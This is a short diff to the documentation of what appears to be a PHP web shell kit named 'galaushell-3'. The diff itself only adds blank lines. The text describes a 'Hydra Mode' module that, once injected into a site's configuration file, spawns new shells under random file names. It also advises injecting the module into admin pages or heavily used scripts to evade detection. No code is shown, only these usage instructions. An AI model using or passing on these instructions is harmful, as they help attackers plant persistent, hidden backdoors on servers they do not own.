@@ -22,7 +22,9 @@ galaushell-3
 		|---> hydra.php
 
 External Modules:
+
 [1] Galau Priv8 [mini] Shell
+
 [2] Hydra Mode
 
 # -=:[ Hydra Mode by ./MyHeartIsyr ]:=-
@@ -31,7 +33,9 @@ Version: 0.1
 Usage: inject hydra.php to configuration file
 
 How it works: 
+
 It will generate a new shell in random name
+
 Ex, ee73e0e3.php
 
 Notice: For evading detection, be sure to inject hydra.php to another script (like: admin page, or to most used script)
